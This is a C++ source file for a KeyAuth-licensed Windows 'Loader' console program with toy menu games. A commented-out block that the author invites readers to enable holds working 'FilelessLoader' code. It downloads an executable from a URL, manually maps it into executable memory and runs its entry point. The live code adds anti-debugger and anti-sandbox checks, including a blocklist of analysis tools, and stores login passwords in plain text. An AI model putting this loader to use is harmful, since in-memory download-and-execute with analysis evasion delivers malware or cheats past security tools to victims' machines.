#include <iostream>
#include <string>
#include <thread>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <windows.h>
#include <random>
#include "auth.hpp"
#include <algorithm>
#include <tlhelp32.h>  // This header is needed for Process32First and Process32Next
#include <psapi.h>     // This header is used for process-related functions
#define TH32CS_PROCESS 0x00000002
#include <string>
#include <thread>
#include "utils.hpp"
#include "skStr.h"
std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);
const std::string compilation_date = (std::string)skCrypt(__DATE__);
const std::string compilation_time = (std::string)skCrypt(__TIME__);
void sessionStatus();

using namespace KeyAuth;

// copy and paste from https://keyauth.cc/app/ and replace these string variables
// Please watch tutorial HERE https://www.youtube.com/watch?v=5x4YkTmFH-U
std::string url = skCrypt("https://keyauth.win/api/1.3/").decrypt(); // change if using KeyAuth custom domains feature
std::string path = skCrypt("").decrypt(); //optional, set a path if you're using the token validation setting

api KeyAuthApp(name, ownerid, version, url, path);
//#pragma comment(lib, "wininet.lib")         


const std::string knownDebuggers[] = {
    "ollydbg.exe",
    "x64dbg.exe",
    "idaq.exe",
    "windbg.exe",
    "dbgview.exe",
    "cheatengine-x86_64.exe",
    "ida.exe"
};

////////// HERE starts code for full RunPE manual map integration, uncomment this, and the main comment if you know what you are doing. /////////
//
//// Function to download a file from a URL
//std::vector<BYTE> DownloadFile(const std::string& url) {
//    HINTERNET hInternet = InternetOpenA("FilelessLoader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
//    if (!hInternet) {
//        std::cerr << "Failed to open internet connection." << std::endl;
//        return {};
//    }
//
//    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
//    if (!hUrl) {
//        std::cerr << "Failed to open URL." << std::endl;
//        InternetCloseHandle(hInternet);
//        return {};
//    }
//
//    std::vector<BYTE> buffer;
//    BYTE tempBuffer[4096];
//    DWORD bytesRead = 0;
//
//    while (InternetReadFile(hUrl, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead) {
//        buffer.insert(buffer.end(), tempBuffer, tempBuffer + bytesRead);
//    }
//
//    InternetCloseHandle(hUrl);
//    InternetCloseHandle(hInternet);
//
//    return buffer;
//}
//
//// Function to manually map the PE file into memory
//bool ManualMap(const std::vector<BYTE>& peData) {
//    // Get the base address of the PE file
//    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData.data();
//    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dosHeader + dosHeader->e_lfanew);
//
//    // Check if the PE file is valid
//    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE || ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
//        std::cerr << "Invalid PE file." << std::endl;
//        return false;
//    }
//
//    // Allocate memory for the PE file
//    LPVOID baseAddress = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//    if (!baseAddress) {
//        std::cerr << "Failed to allocate memory. Error: " << GetLastError() << std::endl;
//        return false;
//    }
//
//    // Copy the headers to the base address
//    memcpy(baseAddress, peData.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
//
//    // Copy the sections to their respective addresses
//    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
//    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
//        LPVOID sectionAddress = (BYTE*)baseAddress + sectionHeader[i].VirtualAddress;
//        memcpy(sectionAddress, peData.data() + sectionHeader[i].PointerToRawData, sectionHeader[i].SizeOfRawData);
//    }
//
//    // Resolve imports
//    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)baseAddress + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
//    while (importDescriptor->Name) {
//        LPCSTR libraryName = (LPCSTR)((BYTE*)baseAddress + importDescriptor->Name);
//        HMODULE library = LoadLibraryA(libraryName);
//        if (!library) {
//            std::cerr << "Failed to load library: " << libraryName << std::endl;
//            VirtualFree(baseAddress, 0, MEM_RELEASE);
//            return false;
//        }
//
//        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)baseAddress + importDescriptor->FirstThunk);
//        while (thunk->u1.Function) {
//            if (thunk->u1.Function & IMAGE_ORDINAL_FLAG) {
//                // Import by ordinal
//                thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
//            }
//            else {
//                // Import by name
//                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)baseAddress + thunk->u1.AddressOfData);
//                thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, importByName->Name);
//            }
//            thunk++;
//        }
//        importDescriptor++;
//    }
//
//    // Execute the entry point
//    DWORD entryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;
//    if (entryPoint) {
//        ((void(*)())((BYTE*)baseAddress + entryPoint))();
//    }
//
//    VirtualFree(baseAddress, 0, MEM_RELEASE);
//    return true;
//}
/////////////////// HERE END Manual Map /////////////////////

// Anti-debugging and anti-sandbox function
// Anti-debugging and anti-sandbox function
void checkForDebuggerAndSandbox() {
    while (true) {
        // Check if a debugger is present
        if (IsDebuggerPresent()) {
            std::cerr << "Debugger detected! Exiting..." << std::endl;
            exit(1);
        }

        // Check for known debugging software
       

        // Sandbox detection (basic heuristic)
        HANDLE hToken = nullptr;
        DWORD dwLength = 0;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwLength)) {
                if (elevation.TokenIsElevated) {
                    CloseHandle(hToken);
                    break;  // Not in a sandbox if running elevated
                }
            }
        }
        CloseHandle(hToken);

        //// Check PEB (Process Environment Block)
        //BOOL isDebugged = FALSE;
        //__asm {
        //    mov eax, fs: [30h]    // PEB address
        //    movzx eax, byte ptr[eax + 2]  // Check "BeingDebugged"
        //    mov isDebugged, eax
        //}
        //if (isDebugged) {
        //    std::cerr << "Debugger detected through PEB! Exiting..." << std::endl;
        //    exit(1);
        //}

        Sleep(1000); // Sleep for a bit before checking again (1 second)
    }
}
// Function to set console color
void setConsoleColor(int color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

// Function to generate a random console title
std::string generateRandomTitle(int length) {
    const std::string characters = "QWERTYUIOPASDFGHJKLZXCVBNM1234567890";

    std::string title;
    std::random_device rd;
    std::mt19937 eng(rd());
    std::uniform_int_distribution<> distr(0, characters.size() - 1);

    for (int i = 0; i < length; ++i) {
        title += characters[distr(eng)];
    }

    return title;
}
// Function to set console title
void setConsoleTitle(const std::string& title) {
    SetConsoleTitleA(title.c_str());
}

// Function to simulate loading screen with beeps
void simulateLoadingScreen() {
    const int totalDots = 30;  // Increased total dots
    std::string baseText = "Loading";
    std::string messages[] = {
        "Initializing...",
        "Loading modules...",
        "Setting up environment...",
        "Acquiring resources...",
        "Finalizing setup...",
        "Almost done..."
    };

    setConsoleColor(9); // Load color

    std::random_device rd;
    std::mt19937 eng(rd());
    std::uniform_int_distribution<> distr(200, 800);

    const int barWidth = 50;

    for (int i = 0; i <= totalDots; ++i) {
        std::cout << "\r";

        int progress = static_cast<int>((static_cast<float>(i) / totalDots) * barWidth);

        std::cout << "\r" << (i < 5 ? messages[0] :
            i < 10 ? messages[1] :
            i < 15 ? messages[2] :
            i < 20 ? messages[3] :
            i < 25 ? messages[4] : messages[5]) << std::flush;

        std::cout << " [" << std::string(progress, '#') << std::string(barWidth - progress, '-') << "] " << i * 3.33 << "% complete";

        Beep(523 + i * 4, 50); // Play a beep sound
        std::this_thread::sleep_for(std::chrono::milliseconds(distr(eng)));
    }

    setConsoleColor(7);
    std::cout << "\rLoading Complete!      " << std::endl;
}

// Function to print ASCII art of Pac-Man
void printPacMan() {
    const std::string pacMan[] = {
        "        .--.        ",
        "       |o_o |       ",
        "       |:_/ |       ",
        "      //   \\ \\      ",
        "     (|     | )     ",
        "    /'\\_   _/`\\    ",
        "    \\___)=(___/   "
    };

    for (const auto& line : pacMan) {
        std::cout << line << std::endl;
    }
}

// Function to display the menu
void displayMenu() {
    setConsoleColor(11); // Light Cyan
    std::cout << "\n==============================\n";
    std::cout << "       Welcome to the Menu    \n";
    std::cout << "==============================\n";
    std::cout << "1. View Pac-Man Art\n";
    std::cout << "2. Play a Fun Game (Coin Flip)\n";
    std::cout << "3. Display a Random Quote\n";
    std::cout << "4. Guess a Number Game\n";
    std::cout << "5. Show a Random Joke\n";
    std::cout << "6. Display Countdown Timer\n";
    std::cout << "7. Exit\n";
    std::cout << "==============================\n";
    setConsoleColor(7);  // Reset to default color
}

// Function to simulate a fun game (flipping a coin)
void playCoinFlip() {
    std::cout << "Flipping a coin..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::random_device rd;
    std::mt19937 eng(rd());
    std::uniform_int_distribution<> distr(0, 1); // 0 or 1
    std::cout << "It's " << (distr(eng) == 0 ? "Heads!" : "Tails!") << std::endl;
}

// Function to display a random motivational quote
void displayRandomQuote() {
    const std::string quotes[] = {
        "Believe in yourself!",
        "Keep pushing forward!",
        "You are capable of amazing things!",
        "Don't stop until you're proud!",
        "Dream big, work hard!"
    };
    std::random_device rd;
    std::mt19937 eng(rd());
    std::uniform_int_distribution<> distr(0, sizeof(quotes) / sizeof(quotes[0]) - 1);
    std::cout << quotes[distr(eng)] << std::endl;
}

// Function to simulate a guessing game
void guessNumber() {
    std::random_device rd;
    std::mt19937 eng(rd());
    std::uniform_int_distribution<> distr(1, 100);
    int randomNumber = distr(eng);
    int guess = 0;

    std::cout << "Guess a number between 1 and 100: " << std::endl;

    while (guess != randomNumber) {
        std::cout << "Your guess: ";
        std::cin >> guess;

        if (guess < randomNumber) {
            std::cout << "Too low! Try again." << std::endl;
        }
        else if (guess > randomNumber) {
            std::cout << "Too high! Try again." << std::endl;
        }
        else {
            std::cout << "Congratulations! You guessed the number!" << std::endl;
        }
    }
}

// Function to display a random joke
void displayRandomJoke() {
    const std::string jokes[] = {
        "Why don't scientists trust atoms? Because they make up everything!",
        "Why did the scarecrow win an award? Because he was outstanding in his field!",
        "Why don't skeletons fight each other? They don't have the guts!",
        "What did one wall say to the other wall? I'll meet you at the corner!",
        "Why was the math book sad? Because it had too many problems!"
    };
    std::random_device rd;
    std::mt19937 eng(rd());
    std::uniform_int_distribution<> distr(0, sizeof(jokes) / sizeof(jokes[0]) - 1);
    std::cout << jokes[distr(eng)] << std::endl;
}

// Function to display a countdown timer
void countdownTimer(int seconds) {
    for (int i = seconds; i >= 0; --i) {
        std::cout << "Countdown: " << i << " seconds remaining." << std::flush;
        std::this_thread::sleep_for(std::chrono::seconds(1));
        std::cout << "\r";
    }
    std::cout << "Time's up!                  " << std::endl;
}
// Function to print colored text
void printColoredText(const std::string& text, const std::string& colorCode) {
    std::cout << colorCode << text << "\033[0m"; // Reset color at end
}

// Beep sound
void playLoginSound() {
    Beep(750, 300); // Frequency of 750 Hz for 300 ms
}

// Display fireworks animation
void displayFireworks() {
    std::cout << "🎆🎇🎆🎇🎆🎇🎆🎇🎆🎇🎆🎇🎆🎇🎆🎇\n";
    Sleep(500);
}

int main() {

    std::string consoleTitle = skCrypt("Loader - Built at:  ").decrypt() + compilation_date + " " + compilation_time;
    SetConsoleTitleA(consoleTitle.c_str());
    std::cout << skCrypt("\n\n Connecting..");

    KeyAuthApp.init();
    if (!KeyAuthApp.response.success)
    {
        std::cout << skCrypt("\n Status: ") << KeyAuthApp.response.message;
        Sleep(1500);
        exit(1);
    }
    if (std::filesystem::exists("test.json")) //check for JSON file
    {
        if (!CheckIfJsonKeyExists("test.json", "username"))
        {
            std::string key = ReadFromJson("test.json", "license");
            KeyAuthApp.license(key);
            if (!KeyAuthApp.response.success)
            {
                std::remove("test.json");
                std::cout << skCrypt("\n Status: ") << KeyAuthApp.response.message;
                Sleep(1500);
                exit(1);
            }
            playLoginSound();
            printColoredText("\n\n Successfully Automatically Logged In\n", "\033[1;32m"); // Green color
            displayFireworks();
        }
        else
        {
            std::string username = ReadFromJson("test.json", "username");
            std::string password = ReadFromJson("test.json", "password");
            KeyAuthApp.login(username, password);
            if (!KeyAuthApp.response.success)
            {
                std::remove("test.json");
                std::cout << skCrypt("\n Status: ") << KeyAuthApp.response.message;
                Sleep(1500);
                exit(1);
            }
            playLoginSound();
            printColoredText("\n\n Successfully Automatically Logged In\n", "\033[1;32m"); // Green color
            displayFireworks();
        }
    }
    else
    {
        std::cout << skCrypt("\n\n [1] Login\n [2] Register\n [3] Upgrade\n [4] License key only\n\n Choose option: ");


        int option;
        std::string username;
        std::string password;
        std::string key;

        std::cin >> option;
        switch (option)
        {
        case 1:
            std::cout << skCrypt("\n\n Enter username: ");
            std::cin >> username;
            std::cout << skCrypt("\n Enter password: ");
            std::cin >> password;
            KeyAuthApp.login(username, password);
            break;
        case 2:
            std::cout << skCrypt("\n\n Enter username: ");
            std::cin >> username;
            std::cout << skCrypt("\n Enter password: ");
            std::cin >> password;
            std::cout << skCrypt("\n Enter license: ");
            std::cin >> key;
            KeyAuthApp.regstr(username, password, key);
            break;
        case 3:
            std::cout << skCrypt("\n\n Enter username: ");
            std::cin >> username;
            std::cout << skCrypt("\n Enter license: ");
            std::cin >> key;
            KeyAuthApp.upgrade(username, key);
            break;
        case 4:
            std::cout << skCrypt("\n Enter license: ");
            std::cin >> key;
            KeyAuthApp.license(key);
            break;
        default:
            printColoredText("\n\n Status: Failure: Invalid Selection\n", "\033[1;31m"); // Red color
            Sleep(3000);
            exit(1);
        }

        if (KeyAuthApp.response.message.empty()) exit(11);
        if (!KeyAuthApp.response.success)
        {
            std::cout << skCrypt("\n Status: ") << KeyAuthApp.response.message;
            Sleep(1500);
            exit(1);
        } 

        if (username.empty() || password.empty())
        {
            WriteToJson("test.json", "license", key, false, "", "");
            std::cout << skCrypt("Successfully Created File For Auto Login");
        }
        else
        {
            WriteToJson("test.json", "username", username, true, "password", password);
            std::cout << skCrypt("Successfully Created File For Auto Login");
        }
    }

    // Start the anti-debugging and anti-sandbox checks in a separate thread
    std::thread safetyCheckThread(checkForDebuggerAndSandbox);
    // Generate a random console title
    std::string randomTitle = generateRandomTitle(10);
    setConsoleTitle(randomTitle);

    // Simulate loading screen
    simulateLoadingScreen();

    // Clear the console
    system("cls");

    // Main loop for menu
    int choice = 0;
    while (true) {
        displayMenu();

        std::cout << "Please choose an option (1-7): ";
        std::cin >> choice;

        switch (choice) {
        case 1:
            std::cout << "\nHere is some Pac-Man Art:\n";
            printPacMan();
            break;
        case 2:
            playCoinFlip();
            break;
        case 3:
            displayRandomQuote();
            break;
        case 4:
            guessNumber();
            break;
        case 5:
            displayRandomJoke();
            break;
        case 6:
            int seconds;
            std::cout << "Enter countdown time in seconds: ";
            std::cin >> seconds;
            countdownTimer(seconds);
            break;
        case 7:
            std::cout << "Exiting the application. Goodbye!\n";
            return 0;
        default:
            std::cout << "Invalid choice! Please choose a valid option.\n";
        }

        // Pause before redisplaying the menu
        std::cout << "\nPress Enter to continue...";
        std::cin.ignore(); // To ignore newline from previous input
        std::cin.get();    // Wait for user input
        system("cls"); // Clear the console again
    }

    // Ensure the safety check thread is joined before exiting
    safetyCheckThread.join();

    return 0;
}


//// URL of the file to download
//std::string url = "http://example.com/.exe"; // Replace with the actual URL
//
//// Download the file
//std::vector<BYTE> fileData = DownloadFile(url);
//if (fileData.empty()) {
//    std::cerr << "Failed to download file." << std::endl;
//    return 1;
//}
//
//// Run the PE file in memory
//if (!ManualMap(fileData)) {
//    std::cerr << "Failed to manually map PE file." << std::endl;
//    return 1;
//}
//
//std::cout << "PE file executed successfully." << std::endl;
//return 0;
//}